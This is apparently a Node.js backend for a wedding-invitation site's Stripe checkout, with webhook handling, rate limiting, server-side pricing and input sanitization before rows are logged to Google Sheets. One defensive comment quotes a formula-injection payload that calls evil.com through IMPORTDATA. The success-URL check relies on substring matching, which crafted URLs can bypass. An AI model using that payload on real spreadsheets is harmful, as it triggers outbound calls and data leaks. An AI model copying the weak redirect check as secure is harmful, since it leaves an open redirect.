// ============================================================
// WEBGENCY — Stripe Checkout Backend v7
// SECURITY: Rate limiting + SERVER-SIDE PRICING + secret key
//           + formula injection protection + input sanitization
// Node.js 18+
// npm install stripe cors express node-fetch express-rate-limit
//
// Environment variables in Railway (Settings → Variables):
//   STRIPE_SECRET_KEY  — your Stripe secret key (already set)
//   SHEETS_WEBHOOK_URL — your Google Apps Script URL (already set)
//   API_SECRET         — secret password shared with your website
// ============================================================

const express   = require('express');
const Stripe    = require('stripe');
const cors      = require('cors');
const rateLimit = require('express-rate-limit');
const { priceOrder } = require('./pricing');

const app    = express();
app.set('trust proxy', 1); // Railway sits in front of the app: rate limits use each visitor's real IP
const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

// ── CORS: only your website can call this API ─────────────────
app.use(cors({
  origin: [
    'https://webgencyinvitations.com',
    'https://www.webgencyinvitations.com',
    'https://tilda.cc',   // Tilda editor preview
    'https://tilda.ws',
  ]
}));

// ── STRIPE WEBHOOK (abandoned checkout reminders) ───────────
// Stripe calls this when an unpaid checkout expires (after 1 hour).
// We verify Stripe's signature, then hand the details to Zapier,
// which sends Mary's reminder emails.
// Railway variables needed:
//   STRIPE_WEBHOOK_SECRET — from Stripe > Developers > Webhooks (starts with whsec_)
//   REMINDER_HOOK_URL     — Zapier "Catch Hook" URL for the reminder Zap
//   EXTRAS_HOOK_URL       — Zapier "Catch Hook" URL for the "Paid extra" Zap
// Stripe events to send: checkout.session.expired + checkout.session.completed
app.post('/stripe-webhook', express.raw({ type: 'application/json' }), async (req, res) => {
  let event;
  try {
    event = stripe.webhooks.constructEvent(req.body, req.headers['stripe-signature'], process.env.STRIPE_WEBHOOK_SECRET);
  } catch (err) {
    console.warn('Webhook signature failed:', err.message);
    return res.status(400).send('Bad signature');
  }
  try {
    if (event.type === 'checkout.session.expired') {
      const s = event.data.object;
      const email = s.customer_email || (s.customer_details && s.customer_details.email) || '';
      const recoveryUrl = s.after_expiration && s.after_expiration.recovery && s.after_expiration.recovery.url;
      if (email && recoveryUrl && process.env.REMINDER_HOOK_URL) {
        const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
        const name = ((s.metadata && s.metadata.customerName) || '').trim();
        await fetch(process.env.REMINDER_HOOK_URL, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email, firstName: name.split(' ')[0] || '', name,
            design: (s.metadata && s.metadata.designType) || '',
            amount: (s.amount_total || 0) / 100, recoveryUrl, expiredAt: new Date().toISOString()
          })
        });
        console.log('Reminder hand-off sent for', email);
      }
    }
    // Extras bought later from the client portal (Stripe Payment Links).
    // Orders from the website form are not Payment Links, so they are ignored here.
    if (event.type === 'checkout.session.completed') {
      const s = event.data.object;
      // Only links opened from the client portal carry the project id (client_reference_id),
      // so other Payment Links you use elsewhere never post anything in the portal.
      if (s.payment_link && s.client_reference_id && s.payment_status === 'paid' && process.env.EXTRAS_HOOK_URL) {
        const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
        let items = '';
        try {
          const li = await stripe.checkout.sessions.listLineItems(s.id, { limit: 20 });
          items = li.data.map(x => (x.quantity > 1 ? x.quantity + ' × ' : '') + (x.description || '')).join(', ');
        } catch (e) { console.warn('Line items not read:', e.message); }
        const d = s.customer_details || {};
        await fetch(process.env.EXTRAS_HOOK_URL, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            projectId: s.client_reference_id,
            email: d.email || s.customer_email || '',
            name: d.name || '',
            items: items || 'an extra',
            amount: (s.amount_total || 0) / 100,
            currency: String(s.currency || 'eur').toUpperCase(),
            sessionId: s.id,
            paidAt: new Date().toISOString()
          })
        });
        console.log('Paid extra hand-off sent:', items, s.client_reference_id || d.email);
      }
    }
  } catch (err) { console.error('Webhook handling error:', err.message); }
  res.json({ received: true });
});

// ── HAS THIS EMAIL PAID? (used by the 2nd reminder) ─────────
// GET /order-status?email=...&key=API_SECRET  →  { paid: true|false }
app.get('/order-status', async (req, res) => {
  try {
    if (!process.env.API_SECRET || req.query.key !== process.env.API_SECRET) return res.status(403).json({ error: 'Forbidden' });
    const email = String(req.query.email || '').toLowerCase().trim();
    if (!email) return res.status(400).json({ error: 'Missing email' });
    const since = Math.floor(Date.now() / 1000) - 3 * 24 * 3600;
    const list = await stripe.checkout.sessions.list({ created: { gte: since }, limit: 100 });
    const paid = list.data.some(x => x.payment_status === 'paid' &&
      String(x.customer_email || (x.customer_details && x.customer_details.email) || '').toLowerCase() === email);
    res.json({ paid });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.use(express.json({ limit: '50kb' })); // reject oversized payloads

// ── RATE LIMITING ─────────────────────────────────────────────
// Max 10 requests per IP per 15 minutes.
// Real customers submit once. Bots get blocked fast.
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests. Please try again in a few minutes.' }
});
app.use('/create-checkout', limiter);

// ── FORMULA INJECTION PROTECTION ─────────────────────────────
// Google Sheets treats any cell starting with = + - @ as a formula.
// An attacker can inject =IMPORTDATA("https://evil.com") into a name
// field and Google Sheets will call that URL.
// This function adds a single quote prefix to neutralise it.
// The data still looks normal in your sheet — just safe.
function sanitize(value) {
  if (typeof value !== 'string') return value;
  // Trim whitespace and remove null bytes
  const trimmed = value.replace(/\0/g, '').trim();
  // Prefix formula-starting characters so Sheets treats them as text
  if (['=', '+', '-', '@', '\t', '\r', '\n'].some(c => trimmed.startsWith(c))) {
    return "'" + trimmed;
  }
  // Remove any email header injection sequences (newlines in emails)
  return trimmed.replace(/[\r\n]/g, ' ');
}

function sanitizeAll(data) {
  const clean = {};
  for (const key of Object.keys(data)) {
    const val = data[key];
    if (typeof val === 'string') {
      clean[key] = sanitize(val);
    } else if (Array.isArray(val)) {
      clean[key] = val.map(v => typeof v === 'string' ? sanitize(v) : v);
    } else {
      clean[key] = val;
    }
  }
  return clean;
}

// ── HELPER: send row to Google Sheets ────────────────────────
async function logToSheets(data) {
  const url = process.env.SHEETS_WEBHOOK_URL;
  if (!url || url === 'PASTE_YOUR_URL_HERE') return;

  // Sanitize EVERYTHING before it touches your sheet
  const safe = sanitizeAll(data);

  try {
    const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
    await fetch(url, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        submittedAt:   new Date().toISOString(),
        customerName:  safe.customerName  || '',
        customerEmail: safe.customerEmail || '',
        designType:    safe.designType    || '',
        amount:        safe.amount        || 0,
        sections:      Array.isArray(safe.sections)     ? safe.sections.join(', ')     : '',
        customBlocks:  Array.isArray(safe.customBlocks) ? safe.customBlocks.join(', ') : '',
        lang1:         safe.lang1         || '',
        extraLangs:    Array.isArray(safe.extraLangs)   ? safe.extraLangs.join(', ')   : '',
        extras:        Array.isArray(safe.extras)       ? safe.extras.join(', ')       : '',
        personalLinks: safe.personalLinks || 0,
        extraVersions: safe.extraVersions || 0,
        eventDate:     safe.eventDate     || '',
        notes:         safe.notes         || '',
        breakdown:     safe.breakdown     || '',
      }),
    });
    console.log('Logged to Sheets OK');
  } catch (err) {
    console.error('Sheets log failed:', err.message);
  }
}

// ── MAIN CHECKOUT ENDPOINT ───────────────────────────────────
app.post('/create-checkout', async (req, res) => {
  try {

    // CHECK 1: Secret header ────────────────────────────────────
    // Your website sends a secret password with every request.
    // Anyone without this password is blocked immediately.
    // Safe to deploy before updating your Tilda block —
    // if API_SECRET is not set yet, this check is skipped.
    const apiSecret = process.env.API_SECRET;
    if (apiSecret) {
      const provided = req.headers['x-api-secret'];
      if (provided !== apiSecret) {
        console.warn('Blocked: wrong API secret from', req.ip);
        return res.status(403).json({ error: 'Forbidden' });
      }
    }

    const {
      amount, currency, customerName, customerEmail,
      designType, sections, customBlocks, lang1, extraLangs,
      extras, personalLinks, extraVersions, eventDate, notes,
      breakdown, successUrl
    } = req.body;

    // CHECK 2: Amount validation ────────────────────────────────
    // Stops amount=-1, amount=999999, amount=1 exploits.
    // Every real Webgency order is between €10 and €2000.
    const amountNum = Number(amount);
    if (!amountNum || amountNum < 10 || amountNum > 2000) {
      console.warn('Blocked: invalid amount', amount, 'from', req.ip);
      return res.status(400).json({ error: 'Invalid amount' });
    }

    // CHECK 3: Required fields ──────────────────────────────────
    // Real orders always have an email and a design type.
    // Bots skipping these fields are rejected immediately.
    if (!customerEmail || !designType) {
      console.warn('Blocked: missing fields from', req.ip);
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // CHECK 4: Email format ─────────────────────────────────────
    // Stops email header injection attacks like you saw in row 253.
    const emailRegex = /^[^\s@\r\n]+@[^\s@\r\n]+\.[^\s@\r\n]+$/;
    if (!emailRegex.test(customerEmail)) {
      console.warn('Blocked: invalid email format from', req.ip);
      return res.status(400).json({ error: 'Invalid email' });
    }

    // CHECK 6: Server-side price ───────────────────────────────
    // The server calculates the price itself from the order, so a
    // changed price in the browser can never be charged.
    // Orders from the OLD order form (short codes like "illus") are
    // still accepted with the old range check, so nothing breaks
    // while the new form is being pasted into Tilda.
    let chargeAmount = amountNum;
    const priced = priceOrder(req.body);
    if (priced.error) {
      console.warn('Legacy/unknown order, using range check only:', priced.error);
    } else {
      if (Math.abs(priced.total - amountNum) > 0.01) {
        console.warn('Price mismatch: page sent', amountNum, 'server price', priced.total, 'from', req.ip);
      }
      chargeAmount = priced.total;
    }

    // CHECK 5: Success URL must be your own domain ──────────────
    // Stops open redirect attacks — nobody can redirect your
    // customers to a fake website after payment.
    const allowedDomains = ['webgencyinvitations.com', 'tilda.ws', 'tilda.cc'];
    const isAllowedUrl = !successUrl || allowedDomains.some(d =>
      successUrl.includes(d)
    );
    if (!isAllowedUrl) {
      console.warn('Blocked: suspicious successUrl', successUrl);
      return res.status(400).json({ error: 'Invalid redirect URL' });
    }

    // All checks passed — log to Sheets (after validation,
    // so bot spam never pollutes your sheet again)
    logToSheets({ ...req.body, amount: chargeAmount }).catch(() => {});

    // Build description for Stripe
    const description = [
      designType,
      sections?.length     ? 'Sections: '   + sections.join(', ')     : '',
      customBlocks?.length ? 'Custom: '      + customBlocks.join(', ') : '',
      lang1                ? 'Language: '    + lang1                   : '',
      extraLangs?.length   ? 'Extra langs: ' + extraLangs.join(', ')   : '',
      extras?.length       ? 'Extras: '      + extras.join(', ')       : '',
      personalLinks        ? 'Links: '       + personalLinks           : '',
      extraVersions        ? 'Versions: '    + extraVersions           : '',
      eventDate            ? 'Event: '       + eventDate               : '',
      notes                ? 'Notes: '       + notes                   : '',
    ].filter(Boolean).join(' | ');

    // Convert euros to cents for Stripe
    // €75 → 75 * 100 = 7500 cents ✓
    const amountInCents = Math.round(chargeAmount * 100);

    // Build success URL — must be your own domain
    const finalSuccessUrl = (successUrl && successUrl.startsWith('https://'))
      ? successUrl + '?session_id={CHECKOUT_SESSION_ID}'
      : 'https://webgencyinvitations.com/thankyou?session_id={CHECKOUT_SESSION_ID}';

    const session = await stripe.checkout.sessions.create({
      payment_method_types: ['card'],
      mode:           'payment',
      customer_email: customerEmail,
      line_items: [{
        price_data: {
          currency:     currency || 'eur',
          unit_amount:  amountInCents,
          product_data: {
            name:        'Webgency — ' + sanitize(designType || 'Invitation'),
            description: description.substring(0, 500),
          },
        },
        quantity: 1,
      }],
      metadata: {
        customerName:  sanitize(customerName  || ''),
        designType:    sanitize(designType    || ''),
        breakdown:     (breakdown || '').substring(0, 500),
        eventDate:     sanitize(eventDate     || ''),
        personalLinks: String(personalLinks   || 0),
        extraVersions: String(extraVersions   || 0),
      },
      success_url: finalSuccessUrl,
      cancel_url:  'https://webgencyinvitations.com/order',
      // Unpaid checkouts expire after 1 hour. Stripe then creates a
      // "continue where you left off" link (after_expiration.recovery.url),
      // used by the reminder emails from Mary (Zapier: checkout.session.expired).
      expires_at: Math.floor(Date.now() / 1000) + 60 * 60,
      after_expiration: { recovery: { enabled: true } },
    });

    res.json({ url: session.url });

  } catch (err) {
    console.error('Stripe error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/', (req, res) => res.send('Webgency checkout server v7 running'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server running on port ' + PORT));
